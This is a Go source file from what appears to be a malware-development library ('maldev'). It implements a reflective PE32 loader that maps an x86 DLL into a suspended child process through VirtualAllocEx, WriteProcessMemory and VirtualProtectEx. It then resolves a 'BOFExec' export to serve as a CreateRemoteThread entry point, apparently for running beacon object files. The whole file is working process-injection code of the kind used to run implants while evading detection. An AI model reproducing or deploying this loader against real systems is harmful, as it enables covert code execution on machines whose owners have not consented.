//go:build windows

package bof

import (
	"encoding/binary"
	"fmt"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// x86PEImage is the minimum PE32 view the reflective loader needs.
// Only the fields actually used by reflectiveLoad / findExportRVA
// are extracted; the rest of the PE format is skipped.
type x86PEImage struct {
	imageBase   uint32
	sizeOfImage uint32

	// Pre-laid image bytes: headers + each section copied at its
	// VirtualAddress + base relocations already applied against
	// the *target* base address. Ready to be written into the
	// child's VirtualAllocEx region with a single
	// WriteProcessMemory call.
	image []byte

	// sections records the per-section protection + virtual span
	// so the parent can VirtualProtectEx the right pages after
	// the bulk write. characteristics encodes EXECUTE / READ /
	// WRITE from the PE section flags.
	sections []x86Section

	// exportRVAs maps export name → RVA. Populated by
	// parsePEAndPlace; the parent uses it to compute the
	// CreateRemoteThread target (BOFExec address).
	exportRVAs map[string]uint32
}

type x86Section struct {
	virtualAddress  uint32
	virtualSize     uint32
	characteristics uint32
}

// PE / IMAGE_* constants. imageScnMemExecute already lives in
// bof_windows.go (COFF loader); the additional flags + directory
// indices for the reflective PE loader are scoped here.
const (
	imageScnMemWrite          uint32 = 0x80000000
	imageDirectoryEntryExport int    = 0
	imageDirectoryEntryBaseR  int    = 5
)

// parsePEAndPlace reads a PE32 DLL from `peBytes`, lays the
// image into a fresh []byte of size SizeOfImage with sections
// copied at their RVAs, applies the .reloc table against the
// `targetBase` address, and returns the prepared image plus
// section / export metadata.
//
// Errors fire for non-PE32 input, malformed section/directory
// tables, missing .reloc data, or out-of-bounds section data —
// every error path leaves no allocation behind because the
// only state is the returned []byte.
func parsePEAndPlace(peBytes []byte, targetBase uint32) (*x86PEImage, error) {
	if len(peBytes) < 0x40 {
		return nil, fmt.Errorf("PE too small (%d bytes)", len(peBytes))
	}
	if peBytes[0] != 'M' || peBytes[1] != 'Z' {
		return nil, fmt.Errorf("PE: bad DOS magic")
	}
	peOff := binary.LittleEndian.Uint32(peBytes[0x3C:])
	if int(peOff)+24 > len(peBytes) {
		return nil, fmt.Errorf("PE: e_lfanew out of bounds")
	}
	if string(peBytes[peOff:peOff+4]) != "PE\x00\x00" {
		return nil, fmt.Errorf("PE: bad NT magic")
	}
	// IMAGE_FILE_HEADER lives at peOff+4 (20 bytes).
	fileHdr := peBytes[peOff+4:]
	machine := binary.LittleEndian.Uint16(fileHdr[0:])
	if machine != 0x014c {
		return nil, fmt.Errorf("PE: not i386 (Machine=0x%X)", machine)
	}
	nSections := int(binary.LittleEndian.Uint16(fileHdr[2:]))
	optHdrSize := int(binary.LittleEndian.Uint16(fileHdr[16:]))
	optHdrOff := int(peOff) + 24

	if optHdrOff+optHdrSize > len(peBytes) {
		return nil, fmt.Errorf("PE: optional header out of bounds")
	}
	optHdr := peBytes[optHdrOff:]
	optMagic := binary.LittleEndian.Uint16(optHdr[0:])
	if optMagic != 0x010b {
		return nil, fmt.Errorf("PE: not PE32 (OptionalHeader.Magic=0x%X)", optMagic)
	}
	// PE32 OptionalHeader field offsets we use:
	//   28: ImageBase (uint32)
	//   56: SizeOfImage (uint32)
	//   60: SizeOfHeaders (uint32)
	//   92: NumberOfRvaAndSizes (uint32)
	//   96: DataDirectory[0..NumberOfRvaAndSizes-1] (8 bytes each)
	imageBase := binary.LittleEndian.Uint32(optHdr[28:])
	sizeOfImage := binary.LittleEndian.Uint32(optHdr[56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(optHdr[60:])
	nRvaAndSizes := binary.LittleEndian.Uint32(optHdr[92:])
	if sizeOfImage == 0 || sizeOfImage > 32*1024*1024 {
		return nil, fmt.Errorf("PE: implausible SizeOfImage=%d", sizeOfImage)
	}

	// DataDirectory[i] = 8 bytes (RVA, Size).
	dirAt := func(i int) (rva, size uint32, ok bool) {
		if uint32(i) >= nRvaAndSizes {
			return 0, 0, false
		}
		off := 96 + i*8
		if off+8 > optHdrSize {
			return 0, 0, false
		}
		return binary.LittleEndian.Uint32(optHdr[off:]),
			binary.LittleEndian.Uint32(optHdr[off+4:]), true
	}

	// Section table follows OptionalHeader.
	secOff := optHdrOff + optHdrSize
	if secOff+nSections*40 > len(peBytes) {
		return nil, fmt.Errorf("PE: section table out of bounds")
	}
	sections := make([]x86Section, 0, nSections)

	// Lay out the image: zero-filled []byte of SizeOfImage, copy
	// headers (the SizeOfHeaders prefix of peBytes), then each
	// section at its VirtualAddress.
	image := make([]byte, sizeOfImage)
	if sizeOfHeaders > uint32(len(peBytes)) {
		return nil, fmt.Errorf("PE: SizeOfHeaders > file size")
	}
	copy(image[:sizeOfHeaders], peBytes[:sizeOfHeaders])

	for i := 0; i < nSections; i++ {
		sh := peBytes[secOff+i*40:]
		vSize := binary.LittleEndian.Uint32(sh[8:])
		vAddr := binary.LittleEndian.Uint32(sh[12:])
		rawSize := binary.LittleEndian.Uint32(sh[16:])
		rawPtr := binary.LittleEndian.Uint32(sh[20:])
		chars := binary.LittleEndian.Uint32(sh[36:])

		if vAddr+rawSize > sizeOfImage {
			return nil, fmt.Errorf("PE: section %d virtual span overflows image", i)
		}
		if rawSize > 0 {
			if rawPtr+rawSize > uint32(len(peBytes)) {
				return nil, fmt.Errorf("PE: section %d raw data out of bounds", i)
			}
			copy(image[vAddr:vAddr+rawSize], peBytes[rawPtr:rawPtr+rawSize])
		}
		span := vSize
		if rawSize > span {
			span = rawSize
		}
		sections = append(sections, x86Section{
			virtualAddress:  vAddr,
			virtualSize:     span,
			characteristics: chars,
		})
	}

	// Apply base relocations. delta = targetBase - imageBase. For
	// PE32 only IMAGE_REL_BASED_HIGHLOW (3) is meaningful — patch
	// the 32-bit uint at image[block_rva + (entry & 0xFFF)] +=
	// delta. IMAGE_REL_BASED_ABSOLUTE (0) is padding and is
	// ignored.
	if relRVA, relSize, ok := dirAt(imageDirectoryEntryBaseR); ok && relRVA != 0 && relSize != 0 {
		delta := targetBase - imageBase
		end := relRVA + relSize
		if end > sizeOfImage {
			return nil, fmt.Errorf("PE: .reloc directory beyond image (rva=0x%X size=%d)", relRVA, relSize)
		}
		cursor := relRVA
		for cursor < end {
			if cursor+8 > end {
				return nil, fmt.Errorf("PE: truncated .reloc block at 0x%X", cursor)
			}
			pageRVA := binary.LittleEndian.Uint32(image[cursor:])
			blockSize := binary.LittleEndian.Uint32(image[cursor+4:])
			if blockSize < 8 || cursor+blockSize > end {
				return nil, fmt.Errorf("PE: bad .reloc block at 0x%X (size=%d)", cursor, blockSize)
			}
			nEntries := (blockSize - 8) / 2
			entriesOff := cursor + 8
			for j := uint32(0); j < nEntries; j++ {
				entry := binary.LittleEndian.Uint16(image[entriesOff+j*2:])
				typ := entry >> 12
				off := uint32(entry & 0x0FFF)
				if typ == 0 { // ABSOLUTE — padding
					continue
				}
				if typ != 3 { // HIGHLOW
					return nil, fmt.Errorf("PE: unsupported .reloc type %d", typ)
				}
				patchOff := pageRVA + off
				if patchOff+4 > sizeOfImage {
					return nil, fmt.Errorf("PE: .reloc patch out of image (rva=0x%X)", patchOff)
				}
				v := binary.LittleEndian.Uint32(image[patchOff:])
				binary.LittleEndian.PutUint32(image[patchOff:], v+delta)
			}
			cursor += blockSize
		}
	}

	// Walk the export directory to map name → RVA. Only the
	// BOFExec export is read by the orchestrator today, but we
	// keep the whole map so phase B-bis step 1.e can resolve
	// Beacon* directly off the same path if needed.
	exportRVAs := map[string]uint32{}
	if expRVA, expSize, ok := dirAt(imageDirectoryEntryExport); ok && expRVA != 0 && expSize != 0 {
		if expRVA+40 > sizeOfImage {
			return nil, fmt.Errorf("PE: export directory out of bounds")
		}
		ed := image[expRVA:]
		nNames := binary.LittleEndian.Uint32(ed[24:])
		funcsRVA := binary.LittleEndian.Uint32(ed[28:])
		namesRVA := binary.LittleEndian.Uint32(ed[32:])
		ordsRVA := binary.LittleEndian.Uint32(ed[36:])

		for i := uint32(0); i < nNames; i++ {
			nameRVA := binary.LittleEndian.Uint32(image[namesRVA+i*4:])
			ord := binary.LittleEndian.Uint16(image[ordsRVA+i*2:])
			funcRVA := binary.LittleEndian.Uint32(image[funcsRVA+uint32(ord)*4:])
			// Read NUL-terminated name from image[nameRVA:].
			end := nameRVA
			for end < sizeOfImage && image[end] != 0 {
				end++
			}
			if end < sizeOfImage {
				exportRVAs[string(image[nameRVA:end])] = funcRVA
			}
		}
	}

	return &x86PEImage{
		imageBase:   imageBase,
		sizeOfImage: sizeOfImage,
		image:       image,
		sections:    sections,
		exportRVAs:  exportRVAs,
	}, nil
}

// sectionProtect maps the IMAGE_SCN_* bits to a PAGE_* value
// suitable for VirtualProtectEx. RWX never appears in the
// downstream call — sections that are both writable and
// executable get RX (the data path through these BOF entries
// is read-only anyway).
func sectionProtect(characteristics uint32) uint32 {
	exec := characteristics&imageScnMemExecute != 0
	write := characteristics&imageScnMemWrite != 0
	switch {
	case exec && write:
		return 0x20 // PAGE_EXECUTE_READ — RWX is the bad smell, downgrade
	case exec:
		return 0x20 // PAGE_EXECUTE_READ
	case write:
		return 0x04 // PAGE_READWRITE
	default:
		return 0x02 // PAGE_READONLY
	}
}

// reflectiveLoadIntoChild manually loads the x86 loader DLL into
// the suspended child process. Steps:
//
//  1. Parse the PE header once (cheap, in-process) to learn
//     SizeOfImage.
//  2. VirtualAllocEx the full image size as RW.
//  3. Run parsePEAndPlace against the returned base address to
//     produce a fully-relocated image buffer.
//  4. WriteProcessMemory the buffer to the child in one shot.
//  5. VirtualProtectEx each section to its real protection
//     (RX / RW / RO — never RWX).
//
// Returns the image base and the absolute address of the
// `BOFExec` export (CreateRemoteThread target).
func reflectiveLoadIntoChild(h windows.Handle, dll []byte) (imageBase, entryAddr uintptr, err error) {
	// Two-pass: probe SizeOfImage by parsing against base=0,
	// VirtualAllocEx to get the real address, then re-parse +
	// place against the real base so .reloc lands correctly.
	probe, err := parsePEAndPlace(dll, 0)
	if err != nil {
		return 0, 0, fmt.Errorf("PE probe: %w", err)
	}
	addr, _, callErr := api.ProcVirtualAllocEx.Call(
		uintptr(h),
		0,
		uintptr(probe.sizeOfImage),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE),
	)
	if addr == 0 {
		return 0, 0, fmt.Errorf("VirtualAllocEx(image): %w", callErr)
	}

	placed, err := parsePEAndPlace(dll, uint32(addr))
	if err != nil {
		return 0, 0, fmt.Errorf("PE place: %w", err)
	}
	if err := windows.WriteProcessMemory(h, addr,
		&placed.image[0], uintptr(len(placed.image)), nil); err != nil {
		return 0, 0, fmt.Errorf("WriteProcessMemory(image): %w", err)
	}

	for i, sec := range placed.sections {
		if sec.virtualSize == 0 {
			continue
		}
		var old uint32
		if err := windows.VirtualProtectEx(h,
			addr+uintptr(sec.virtualAddress),
			uintptr(sec.virtualSize),
			sectionProtect(sec.characteristics),
			&old); err != nil {
			return 0, 0, fmt.Errorf("VirtualProtectEx(section %d): %w", i, err)
		}
	}

	exportRVA, ok := placed.exportRVAs["BOFExec"]
	if !ok {
		return 0, 0, fmt.Errorf("BOFExec export missing from loader DLL")
	}
	return addr, addr + uintptr(exportRVA), nil
}
